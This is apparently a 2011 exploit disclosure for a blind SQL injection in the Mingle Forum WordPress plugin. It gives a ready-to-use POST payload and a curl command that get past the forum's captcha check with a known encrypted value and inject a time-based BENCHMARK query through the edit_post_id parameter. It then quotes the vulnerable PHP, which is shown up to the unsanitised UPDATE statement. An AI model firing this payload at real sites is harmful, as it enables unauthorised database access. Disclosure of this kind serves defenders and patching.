# Date: 2011-09-19
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.0.31 (tested)
# Note: wpf_str_encrypt($_POST[&#039;wpf_security_code&#039;]) == $_POST[&#039;wpf_security_check&#039;]
 
---------------
PoC (POST data)
---------------
http://www.site.com/wp-content/plugins/mingle-forum/wpf-insert.php
 wpf_security_check=MhWNow%3D%3D&wpf_security_code=fail&edit_post_submit=1&message=test&edit_post_subject=test&thread_id=1&edit_post_id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
 
e.g.
curl --data "wpf_security_check=MhWNow%3D%3D&wpf_security_code=fail&edit_post_submit=1&message=test&edit_post_subject=test&thread_id=1&edit_post_id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)" http://www.site.com/wp-content/plugins/mingle-forum/wpf-insert.php
 
---------------
Vulnerable code
---------------
    if (!isset($_POST[&#039;edit_post_submit&#039;])) {
        $errormsg = apply_filters(&#039;wpwf_check_guestinfo&#039;,"");
        if ($errormsg != "") {
            $error = true;
            wp_die($errormsg);
        }
    }
 
    if($options[&#039;forum_captcha&#039;] == true && !$user_ID){
        include_once(WPFPATH."captcha/shared.php");
        $wpf_code = wpf_str_decrypt($_POST[&#039;wpf_security_check&#039;]); // wpf_str_decrypt("MhWNow==") == "fail"
            if(($wpf_code == $_POST[&#039;wpf_security_code&#039;]) && (!empty($wpf_code))) {
              // do nothing
            }
            else {
                $error = true;
                $msg = __("Security code does not match", "mingleforum");
                wp_die($msg);
            }
    }
 
    ...
 
    if(isset($_POST[&#039;edit_post_submit&#039;])){
        $myReplaceSub = array("&#039;", "\\");
        $subject = str_replace($myReplaceSub, "", $mingleforum->input_filter($_POST[&#039;edit_post_subject&#039;]));
        $content = $mingleforum->input_filter($_POST[&#039;message&#039;]);
        $thread = $mingleforum->check_parms($_POST[&#039;thread_id&#039;]);
        $edit_post_id = $_POST[&#039;edit_post_id&#039;];
 
        if($subject == ""){
            $msg .= "<h2>".__("An error occured", "mingleforum")."</h2>";
            $msg .= ("<div id=&#039;error&#039;><p>".__("You must enter a subject", "mingleforum")."</p></div>");
            $error = true;
        }
        elseif($content == ""){
            $msg .= "<h2>".__("An error occured", "mingleforum")."</h2>";
            $msg .= ("<div id=&#039;error&#039;><p>".__("You must enter a message", "mingleforum")."</p></div>");
            $error = true;
        }
 
        if ($error) wp_die($msg);
 
        //SECURITY FIX NEEDED <-- actual author&#039;s comment :)
        $sql = ("UPDATE $mingleforum->t_posts SET text = &#039;$content&#039;, subject = &#039;$subject&#039; WHERE id = $edit_post_id");



